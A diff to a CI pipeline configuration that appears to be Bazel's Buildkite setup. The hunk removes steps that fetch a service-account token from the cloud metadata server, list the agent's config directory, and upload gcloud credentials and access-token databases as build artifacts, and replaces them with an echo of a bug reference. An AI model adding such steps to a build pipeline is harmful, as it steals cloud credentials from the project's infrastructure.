@@ -114,13 +114,7 @@ tasks:
       - rm -f WORKSPACE.bak
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
-      - gcloud info
-      - gcloud auth list || true
-      - nc -h || true
-      - "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'"
-      - ls -aR /var/lib/buildkite-agent/.config
-      - buildkite-agent artifact upload /var/lib/buildkite-agent/.config/gcloud/credentials.db || true
-      - buildkite-agent artifact upload /var/lib/buildkite-agent/.config/gcloud/access_tokens.db || true
+      - echo b/251400303
     build_flags:
       - "--test_env=TEST_INSTALL_BASE=$HOME/bazeltest/install_base"
       - "--test_env=TEST_REPOSITORY_HOME=$OUTPUT_BASE/external"
